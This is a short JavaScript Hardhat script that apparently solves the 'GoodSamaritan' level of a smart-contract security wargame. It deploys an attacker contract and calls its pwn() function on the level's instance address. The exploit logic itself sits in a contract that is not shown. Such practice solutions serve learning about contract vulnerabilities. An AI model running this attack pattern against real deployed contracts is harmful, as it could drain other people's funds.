const {
    GOOD_SAMARITAN_INSTANCE_ADDRESS,
    logStartingLevel,
    logSuccessfullyLevel,
    logInstanceAddressIsNull,
    logInstanceAddress,
    logTransactionLink
} = require('./utils');

async function main(levelName = 'GoodSamaritan') {
    logStartingLevel(levelName);

    if (!GOOD_SAMARITAN_INSTANCE_ADDRESS) {
        logInstanceAddressIsNull(levelName);
        return;
    }
    logInstanceAddress(levelName, GOOD_SAMARITAN_INSTANCE_ADDRESS);

    const factory = await ethers.getContractFactory("GoodSamaritan");
    const contract = factory.attach(GOOD_SAMARITAN_INSTANCE_ADDRESS);

    const attackerFactory = await ethers.getContractFactory("GoodSamaritanAttacker");
    const attackerContract = await attackerFactory.deploy();
    await attackerContract.deployed();

    const tx = await attackerContract.pwn(contract.address);
    logTransactionLink(tx.hash);
    await tx.wait(1);

    logSuccessfullyLevel(levelName);
}

module.exports = main;
